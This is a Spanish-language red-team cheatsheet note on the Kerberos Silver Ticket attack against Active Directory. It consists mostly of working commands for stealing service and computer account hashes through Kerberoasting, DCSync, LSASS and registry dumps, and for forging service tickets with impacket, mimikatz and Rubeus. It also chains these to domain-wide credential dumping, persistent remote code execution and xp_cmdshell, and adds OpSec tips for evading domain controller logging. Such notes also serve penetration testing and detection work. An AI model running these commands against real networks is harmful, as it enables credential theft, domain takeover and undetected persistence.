---
aliases:
  - Silver Ticket Attack
  - Forged TGS
tags:
  - type/atomic
  - technique/persistence
  - technique/lateral-movement
  - technique/kerberos
  - env/windows
  - asset/active-directory
  - cred/kerberos
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Post-Explotación]]"
tertiary categories:
  - "[[Active Directory]]"
type: Atomic
linked:
  - "[[Active Directory Explotación]]"
  - "[[Golden Ticket]]"
  - "[[Pass-the-Ticket]]"
  - "[[Kerberoasting]]"
  - "[[Rubeus]]"
  - "[[Impacket Toolkit]]"
  - "[[Mimikatz Cheatsheet]]"
---
# Silver Ticket

***

## Cheatsheet
^silver-ticket

| Paso | Comando |
| --- | --- |
| **Obtener hash de service account** | Kerberoast crack / DCSync / LSASS dump |
| **Forjar TGS (impacket)** | `impacket-ticketer -nthash SVC_HASH -domain-sid SID -domain dom.local -spn cifs/host.dom.local administrator` |
| **Forjar TGS (mimikatz)** | `kerberos::golden /user:admin /domain:dom.local /sid:SID /target:host.dom.local /service:cifs /rc4:HASH /ptt` |
| **Forjar TGS (Rubeus)** | `Rubeus.exe silver /service:cifs/host.dom.local /rc4:HASH /ldap /user:admin /ptt` |
| **Usar (Linux)** | `export KRB5CCNAME=tkt.ccache; impacket-psexec -k -no-pass host.dom.local` |

***

## Concepto

Con el NT hash (o AES key) de **cualquier service account** (o computer account) se puede forjar un TGS (Ticket-Granting Service) arbitrario para un servicio específico de ese target.

A diferencia de Golden: no pasa por el DC — el target service valida el TGS con su propia key. Si la key es correcta, el ticket es aceptado sin consultar al DC.

**Menor alcance que Golden** (solo el servicio targeted) pero **menor ruido** (no genera 4768/4769 en DC).

## Requisitos

- NT hash o AES key del service/computer account target.
- Domain SID.
- SPN del servicio (`cifs/host`, `mssql/host:1433`, `http/host`, `ldap/host`).
- Conectividad al servicio (no al DC).

## SPN por servicio

| Servicio | SPN |
| --- | --- |
| **SMB / File share** | `cifs/host.dom.local` |
| **MSSQL** | `mssqlsvc/host.dom.local:1433` |
| **HTTP / WinRM / IIS** | `http/host.dom.local` |
| **LDAP / DCSync (requiere DC$)** | `ldap/dc.dom.local` |
| **RPC / DCOM** | `host/host.dom.local` |
| **Scheduled Tasks** | `host/host.dom.local` |
| **WMI** | `host/host.dom.local`, `rpcss/host.dom.local` |

Host service = computer account: `cifs/HOST`, `host/HOST`, `ldap/HOST` (DCs only).

## 1. Obtener hash del service account

### Kerberoasting (cuenta user con SPN)
```bash
impacket-GetUserSPNs dom.local/user:pass -request -outputfile tgs.txt
hashcat -m 13100 tgs.txt rockyou.txt
# → password → NTLM hash
```

### DCSync (computer account)
```bash
impacket-secretsdump dom.local/da:pass@DC -just-dc-user 'TARGET$'
# TARGET$:computerRID:LM:NTHASH:::
```

### LSASS (con sesión admin en target)
```powershell
mimikatz # sekurlsa::msv
# Buscar TARGET$ o service account
```

### Local dump del host target
```powershell
# Con admin local
reg save HKLM\SYSTEM SYSTEM
reg save HKLM\SECURITY SECURITY
impacket-secretsdump LOCAL -security SECURITY -system SYSTEM
# Computer account hash en LSA secrets
```

## 2. Forjar TGS (impacket-ticketer)

```bash
impacket-ticketer \
  -nthash COMPUTERHASH \
  -domain-sid S-1-5-21-... \
  -domain dom.local \
  -spn cifs/target.dom.local \
  administrator
# → administrator.ccache
```

Con AES (preferible):
```bash
impacket-ticketer \
  -aesKey AES256_KEY \
  -domain-sid SID \
  -domain dom.local \
  -spn cifs/target.dom.local \
  administrator
```

Para DCSync via silver (requiere hash de DC$):
```bash
impacket-ticketer -nthash DC_HASH -domain-sid SID -domain dom.local -spn ldap/dc.dom.local administrator
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass dom.local/administrator@dc.dom.local -just-dc
```

## 3. Forjar TGS (mimikatz)

```
mimikatz # kerberos::golden /user:Administrator /domain:dom.local /sid:S-1-5-21-... /target:target.dom.local /service:cifs /rc4:HASH /id:500 /ptt
```

## 4. Forjar TGS (Rubeus)

```powershell
# RC4
.\Rubeus.exe silver /service:cifs/target.dom.local /rc4:HASH /ldap /user:admin /ptt

# AES256 (recomendado)
.\Rubeus.exe silver /service:cifs/target.dom.local /aes256:KEY /ldap /user:admin /ptt

# Sin /ldap (PAC manual)
.\Rubeus.exe silver /service:cifs/target.dom.local /rc4:HASH /user:admin /id:500 /groups:512,513,518,519,520 /sid:SID /domain:dom.local /ptt
```

`/ldap` consulta AD para PAC real del user → más realista.

## 5. Multi-SPN tickets

Para operaciones que usan múltiples SPNs sobre el mismo host:

```powershell
# WMI típicamente requiere: host/ + rpcss/
.\Rubeus.exe silver /service:host/target.dom.local,rpcss/target.dom.local /rc4:HASH /user:admin /ptt
```

## 6. Chains

### DCSync via Silver Ticket
Con hash de DC$ forjar TGS para `ldap/dc.dom.local` → secretsdump sin DA.

### Persistence via computer account
Silver ticket para `cifs/` o `host/` de target → RCE persistente aun post password reset del user inicial.

### MSSQL xp_cmdshell
Hash de cuenta `sa` kerberoasteable → TGS `mssqlsvc/` → login Kerberos → `xp_cmdshell`.

## 7. OpSec

### Ventajas
- No toca DC → **no genera 4768** (TGT request).
- Service validation es local → eventos 4624 en target pero sin TGS request visible en DC (4769).
- Lifetime arbitrario.

### Detecciones
- **PAC validation**: si servicio valida PAC vs DC, TGS forjado se detecta.
- **Event 4624** con logon type 3 + Kerberos sin 4768 previo correlacionado.
- **Encryption mismatch**: RC4 cuando dominio usa AES.
- **Ticket lifetime** anómalo.

### Tips
- Usar AES256 si dominio lo soporta.
- User real existente con RID coherente.
- Lifetime realista (<24h).
- Purge tickets antes de inyectar.

## 8. Invalidación

Silver es válido hasta que:
- Service account / computer account **rote password**.
- Computer accounts rotan default cada 30 días (policy configurable).

Preferible usar hash de cuentas service con rotation lenta o manual.

## Diferencias clave con Golden

| | Golden | Silver |
| --- | --- | --- |
| Key | krbtgt | Service/computer account |
| Tipo | TGT | TGS |
| Scope | Todo el dominio | 1 servicio en 1 host |
| Interacción DC | Sí (TGS requests) | No (ticket usado directo) |
| Ruido | 4768 en DC | Solo 4624 en target |
| Persistence | Hasta doble rotación krbtgt | Hasta rotation del account |

## Recursos

- [HackTricks - Silver Ticket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket)
- [ADSecurity - Silver Tickets](https://adsecurity.org/?p=2011)
- [Rubeus - Silver](https://github.com/GhostPack/Rubeus#silver)

***
